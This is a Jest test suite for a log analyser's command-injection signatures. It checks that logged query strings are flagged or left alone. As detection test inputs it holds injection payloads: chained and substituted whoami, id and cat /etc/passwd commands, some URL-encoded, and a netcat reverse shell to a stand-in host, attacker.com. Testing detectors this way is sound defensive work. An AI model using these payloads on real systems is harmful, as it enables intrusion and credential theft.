/**
 * Tests for command injection signatures.
 *
 * Covers shell metacharacter injection, command substitution,
 * and references to common reconnaissance commands (whoami, id, uname).
 */

import { detectWith } from '../../src/core/detector';
import { COMMAND_INJECTION_SIGNATURES } from '../../src/signatures/command-injection';
import type { LogEntry } from '../../src/types/log.types';

function makeEntry(overrides: Partial<LogEntry> = {}): LogEntry {
  return {
    timestamp: new Date('2024-01-01T00:00:00Z'),
    ip: '127.0.0.1',
    method: 'GET',
    path: '/',
    statusCode: 200,
    format: 'apache',
    raw: 'fake',
    ...overrides,
  };
}

describe('command injection signatures', () => {
  describe('shell metacharacter chaining', () => {
    it('detects semicolon-chained command', () => {
      const entry = makeEntry({ queryString: 'host=example.com;cat /etc/passwd' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
      expect(result.threats[0]?.type).toBe('COMMAND_INJECTION');
    });

    it('detects pipe-chained command', () => {
      const entry = makeEntry({ queryString: 'name=test|whoami' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
    });

    it('detects && conditional execution', () => {
      const entry = makeEntry({ queryString: 'q=test&&id' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
    });

    it('detects URL-encoded semicolon and command', () => {
      const entry = makeEntry({ queryString: 'host=example.com%3Bcat%20/etc/passwd' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
    });
  });

  describe('command substitution', () => {
    it('detects backtick substitution', () => {
      const entry = makeEntry({ queryString: 'q=test`whoami`' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
    });

    it('detects $(...) substitution', () => {
      const entry = makeEntry({ queryString: 'q=test$(id)' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
    });

    it('detects URL-encoded $(...) substitution', () => {
      const entry = makeEntry({ queryString: 'q=test%24%28id%29' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
    });
  });

  describe('recon command references', () => {
    it('detects bare whoami in query string', () => {
      const entry = makeEntry({ queryString: 'cmd=whoami' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
    });

    it('detects /bin/sh reference', () => {
      const entry = makeEntry({ queryString: 'cmd=/bin/sh' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
    });

    it('detects netcat reverse shell pattern', () => {
      const entry = makeEntry({ queryString: 'cmd=nc -e /bin/sh attacker.com 4444' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats.length).toBeGreaterThan(0);
    });
  });

  describe('false positive prevention', () => {
    it('does NOT trigger on a normal query with a single ampersand parameter separator', () => {
      // ?a=1&b=2 has & but not && — should NOT trigger
      const entry = makeEntry({ queryString: 'a=1&b=2&c=3' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats).toHaveLength(0);
    });

    it('does NOT trigger on the word "test" alone', () => {
      const entry = makeEntry({ queryString: 'q=test' });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats).toHaveLength(0);
    });

    it('does NOT trigger on a single pipe in HTML or markdown content', () => {
      // A pipe alone, surrounded by letters/spaces, may be content, not a command
      // We require the pipe to be followed by what looks like a command word.
      const entry = makeEntry({ queryString: 'note=apple%20%7C%20orange' }); // "apple | orange"
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats).toHaveLength(0);
    });

    it('does NOT trigger on userAgent (command injection targets path/queryString)', () => {
      const entry = makeEntry({
        queryString: 'q=hello',
        userAgent: 'Mozilla/5.0 ; whoami',
      });
      const result = detectWith(entry, COMMAND_INJECTION_SIGNATURES);

      expect(result.threats).toHaveLength(0);
    });
  });

  describe('signature metadata', () => {
    it('all command injection signatures have type COMMAND_INJECTION', () => {
      for (const sig of COMMAND_INJECTION_SIGNATURES) {
        expect(sig.type).toBe('COMMAND_INJECTION');
      }
    });

    it('all command injection signatures target path or queryString', () => {
      for (const sig of COMMAND_INJECTION_SIGNATURES) {
        const allowed: ReadonlyArray<string> = ['path', 'queryString'];
        for (const f of sig.fields) {
          expect(allowed).toContain(f);
        }
      }
    });

    it('all command injection signatures have OWASP A03:2021 mapping', () => {
      // OWASP A03:2021 = Injection (covers SQL, command, LDAP, etc.)
      for (const sig of COMMAND_INJECTION_SIGNATURES) {
        expect(sig.owaspCategory).toBe('A03:2021');
      }
    });
  });
});